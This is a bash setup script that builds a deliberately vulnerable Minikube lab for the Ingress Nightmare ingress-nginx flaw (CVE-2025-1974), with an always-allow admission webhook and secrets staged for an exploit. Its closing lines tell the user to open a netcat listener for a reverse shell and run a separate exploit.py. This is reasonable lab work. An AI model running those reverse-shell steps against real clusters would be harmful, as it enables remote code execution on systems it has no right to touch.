#!/bin/bash
#
# Setup script for Ingress Nightmare vulnerability (CVE-2025-1974) testing
# This script creates a Minikube environment with a vulnerable nginx ingress
# controller and admission webhook for testing purposes.
#
# IMPORTANT: This is for educational purposes only. Do not run in production.

set -e

KUBECTL="kubectl"
MINIKUBE="minikube"

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}=== Setting up vulnerable Kubernetes environment for Ingress Nightmare (CVE-2025-1974) ===${NC}"

# Check if required tools are installed
command -v $MINIKUBE >/dev/null 2>&1 || { echo -e "${RED}Error: minikube is not installed${NC}" >&2; exit 1; }
command -v $KUBECTL >/dev/null 2>&1 || { echo -e "${RED}Error: kubectl is not installed${NC}" >&2; exit 1; }
command -v openssl >/dev/null 2>&1 || { echo -e "${RED}Error: openssl is not installed${NC}" >&2; exit 1; }

# Step 1: Set up Minikube cluster
echo -e "${YELLOW}[1/8] Setting up Minikube...${NC}"
$MINIKUBE delete || true
$MINIKUBE start --kubernetes-version=v1.23.5 --driver=docker --memory=4096 --cpus=2

# Step 2: Generate TLS certificates for the webhook
echo -e "${YELLOW}[2/8] Generating TLS certificates...${NC}"
mkdir -p certs
cd certs

# Generate CA certificate
echo -e "${BLUE}Generating CA certificate...${NC}"
openssl genrsa -out ca.key 2048
openssl req -x509 -new -nodes -key ca.key -days 365 -out ca.crt -subj "/CN=admission-webhook-ca"

# Generate webhook server certificate
echo -e "${BLUE}Generating webhook server certificate...${NC}"
openssl genrsa -out webhook-server-tls.key 2048
cat > webhook-csr.conf <<EOF
[req]
req_extensions = v3_req
distinguished_name = req_distinguished_name
[req_distinguished_name]
[ v3_req ]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = admission-webhook
DNS.2 = admission-webhook.default
DNS.3 = admission-webhook.default.svc
EOF

openssl req -new -key webhook-server-tls.key -out webhook-server-tls.csr -subj "/CN=admission-webhook.default.svc" -config webhook-csr.conf
openssl x509 -req -in webhook-server-tls.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out webhook-server-tls.crt -days 365 -extensions v3_req -extfile webhook-csr.conf

cd ..

# Step 3: Enable ingress addon in Minikube
echo -e "${YELLOW}[3/8] Enabling ingress controller...${NC}"
$MINIKUBE addons enable ingress

# Wait for the ingress controller to be ready
echo -e "${BLUE}Waiting for ingress controller to be ready...${NC}"
for i in $(seq 1 30); do
    if $KUBECTL get pods -n ingress-nginx -l app.kubernetes.io/component=controller 2>/dev/null | grep -q "Running"; then
        echo -e "${GREEN}Ingress controller is running${NC}"
        break
    fi
    echo -n "."
    sleep 5
    if [ $i -eq 30 ]; then
        echo -e "${RED}Timed out waiting for ingress controller${NC}"
        exit 1
    fi
done

# Wait specifically for the admission webhook to be ready
echo -e "${BLUE}Waiting for ingress-nginx admission webhook to be ready...${NC}"
for i in $(seq 1 30); do
    if $KUBECTL get svc -n ingress-nginx ingress-nginx-controller-admission 2>/dev/null | grep -q ingress-nginx-controller-admission; then
        echo -e "${GREEN}Ingress admission service is ready${NC}"
        break
    fi
    echo -n "."
    sleep 2
    if [ $i -eq 30 ]; then
        echo -e "${YELLOW}Warning: Didn't detect ingress admission service, but continuing anyway${NC}"
    fi
done

# Step 4: Create secrets and configmaps
echo -e "${YELLOW}[4/8] Creating Kubernetes secrets...${NC}"
$KUBECTL create secret tls webhook-server-tls \
    --cert=certs/webhook-server-tls.crt \
    --key=certs/webhook-server-tls.key

# Create the calico-system namespace and secrets (required for exploit)
$KUBECTL create namespace calico-system || true
$KUBECTL create secret tls node-certs \
    --cert=certs/webhook-server-tls.crt \
    --key=certs/webhook-server-tls.key \
    --namespace=calico-system

# Step 5: Deploy the admission webhook
echo -e "${YELLOW}[5/8] Creating admission webhook...${NC}"
cat > webhook.yaml <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: admission-webhook
  labels:
    app: admission-webhook
spec:
  replicas: 1
  selector:
    matchLabels:
      app: admission-webhook
  template:
    metadata:
      labels:
        app: admission-webhook
    spec:
      containers:
      - name: webhook
        image: python:3.9
        command:
        - /bin/bash
        - -c
        - |
          pip install requests
          cat > /webhook.py <<'EOFPY'
          #!/usr/bin/env python3
          import http.server
          import ssl
          import json
          import os
          import sys

          class WebhookHandler(http.server.BaseHTTPRequestHandler):
              def do_GET(self):
                  print(f"[*] Received GET request to {self.path}")
                  self.send_response(200)
                  self.send_header('Content-Type', 'text/plain')
                  self.end_headers()
                  self.wfile.write(b'Webhook server is running')

              def do_POST(self):
                  content_length = int(self.headers['Content-Length'])
                  post_data = self.rfile.read(content_length)
                  
                  print(f"[*] Received POST request to {self.path}")
                  print(f"[*] Raw data: {post_data[:200]}...")  # Print first 200 chars
                  
                  try:
                      admission_review = json.loads(post_data.decode('utf-8'))
                      
                      # Always allow (since this is just a test webhook)
                      response = {
                          "apiVersion": "admission.k8s.io/v1",
                          "kind": "AdmissionReview",
                          "response": {
                              "uid": admission_review.get("request", {}).get("uid", ""),
                              "allowed": True
                          }
                      }
                      
                      json_response = json.dumps(response)
                      print(f"[*] Sending response: {json_response}")
                      
                      self.send_response(200)
                      self.send_header('Content-Type', 'application/json')
                      self.end_headers()
                      self.wfile.write(json_response.encode())
                  except Exception as e:
                      print(f"[!] Error processing request: {str(e)}")
                      # Even on error, send valid JSON
                      error_response = {
                          "apiVersion": "admission.k8s.io/v1",
                          "kind": "AdmissionReview",
                          "response": {
                              "uid": "unknown",
                              "allowed": False,
                              "status": {
                                  "message": f"Error: {str(e)}"
                              }
                          }
                      }
                      self.send_response(200)
                      self.send_header('Content-Type', 'application/json')
                      self.end_headers()
                      self.wfile.write(json.dumps(error_response).encode())

          if __name__ == '__main__':
              cert_path = '/certs/tls.crt'
              key_path = '/certs/tls.key'
              
              if not os.path.exists(cert_path) or not os.path.exists(key_path):
                  print(f"[!] Certificate files not found at {cert_path} and {key_path}")
                  sys.exit(1)
              
              print(f"[*] Starting webhook server on port 8443")
              server_address = ('', 8443)
              httpd = http.server.HTTPServer(server_address, WebhookHandler)
              
              # Enable HTTPS
              context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
              context.load_cert_chain(cert_path, key_path)
              httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
              
              print(f"[*] Webhook server ready!")
              httpd.serve_forever()
          EOFPY
          
          chmod +x /webhook.py
          python /webhook.py
        ports:
        - containerPort: 8443
        volumeMounts:
        - name: webhook-certs
          mountPath: /certs
          readOnly: true
      volumes:
      - name: webhook-certs
        secret:
          secretName: webhook-server-tls
---
apiVersion: v1
kind: Service
metadata:
  name: admission-webhook
spec:
  selector:
    app: admission-webhook
  ports:
  - port: 443
    targetPort: 8443
EOF

$KUBECTL apply -f webhook.yaml

# Step 6: Create Validating Webhook Configuration
echo -e "${YELLOW}[6/8] Creating validating webhook configuration...${NC}"

CA_BUNDLE=$(cat certs/ca.crt | base64 | tr -d '\n')

cat > webhook-configuration.yaml <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: ingress-validation-webhook
webhooks:
- name: ingress-validation.example.com
  clientConfig:
    service:
      name: admission-webhook
      namespace: default
      path: "/admission"
    caBundle: ${CA_BUNDLE}
  rules:
  - apiGroups: ["networking.k8s.io"]
    apiVersions: ["v1"]
    operations: ["CREATE", "UPDATE"]
    resources: ["ingresses"]
    scope: "Namespaced"
  admissionReviewVersions: ["v1"]
  sideEffects: None
  timeoutSeconds: 5
  failurePolicy: Ignore
EOF

$KUBECTL apply -f webhook-configuration.yaml

# Step 7: Create test application and ingress
echo -e "${YELLOW}[7/8] Setting up test application...${NC}"
cat > test-app.yaml <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: test-app
  template:
    metadata:
      labels:
        app: test-app
    spec:
      containers:
      - name: nginx
        image: nginx:1.19
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: test-app
spec:
  selector:
    app: test-app
  ports:
  - port: 80
    targetPort: 80
EOF

$KUBECTL apply -f test-app.yaml

# Wait for all pods to be ready
echo -e "${YELLOW}[8/8] Waiting for all resources to be ready...${NC}"
echo -e "${BLUE}Waiting for admission webhook pod...${NC}"
$KUBECTL rollout status deployment/admission-webhook --timeout=90s

echo -e "${BLUE}Waiting for ingress controller pod...${NC}"
$KUBECTL rollout status deployment/ingress-nginx-controller -n ingress-nginx --timeout=90s

echo -e "${BLUE}Waiting for test application pod...${NC}"
$KUBECTL rollout status deployment/test-app --timeout=90s

# Create test ingress with retries
echo -e "${BLUE}Creating test ingress (with retries)...${NC}"
cat > test-ingress.yaml <<EOF
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: test-ingress
  annotations:
    nginx.ingress.kubernetes.io/backend-protocol: HTTP
spec:
  rules:
  - host: test.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: test-app
            port:
              number: 80
EOF

# Try to create the ingress with retries
MAX_RETRIES=10
for i in $(seq 1 $MAX_RETRIES); do
  echo -e "${BLUE}Attempt $i/$MAX_RETRIES to create ingress...${NC}"
  if $KUBECTL apply -f test-ingress.yaml; then
    echo -e "${GREEN}Ingress created successfully!${NC}"
    break
  else
    echo -e "${YELLOW}Ingress creation failed, waiting before retry...${NC}"
    sleep 10
    if [ $i -eq $MAX_RETRIES ]; then
      echo -e "${RED}Failed to create ingress after $MAX_RETRIES attempts${NC}"
      echo -e "${YELLOW}Continuing anyway - you can try to create it manually later${NC}"
    fi
  fi
done

# Set up port-forwarding
echo -e "${GREEN}Setting up port forwarding...${NC}"
INGRESS_POD=$($KUBECTL get pods -n ingress-nginx -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
$KUBECTL port-forward -n ingress-nginx $INGRESS_POD 8080:80 &
echo $! > ingress-port-forward.pid

$KUBECTL port-forward svc/admission-webhook 8443:443 &
echo $! > webhook-port-forward.pid

# Add to hosts file
echo -e "${BLUE}Consider adding this line to your /etc/hosts file:${NC}"
echo "127.0.0.1 test.example.com"

# Print verification and exploitation instructions
echo -e "${GREEN}=== Environment setup complete! ===${NC}"
echo -e "${BLUE}Ingress controller URL: http://localhost:8080/${NC}"
echo -e "${BLUE}Admission webhook URL: https://localhost:8443/admission${NC}"
echo -e "${YELLOW}"
echo "To verify setup:"
echo "  1. curl -k https://localhost:8443/ (should return 'Webhook server is running')"
echo "  2. curl -H \"Host: test.example.com\" http://localhost:8080/ (should return nginx welcome page)"
echo ""
echo "To run the exploit:"
echo "  1. Start a netcat listener: nc -lvnp 4444"
echo "  2. Run the exploit script: python3 exploit.py \"http://localhost:8080/\" \"https://localhost:8443\" \"YOUR_IP:4444\" --debug"
echo "${NC}"

echo -e "${GREEN}To stop port forwarding when done:${NC}"
echo "  kill \$(cat ingress-port-forward.pid) \$(cat webhook-port-forward.pid)"
echo "  rm ingress-port-forward.pid webhook-port-forward.pid"
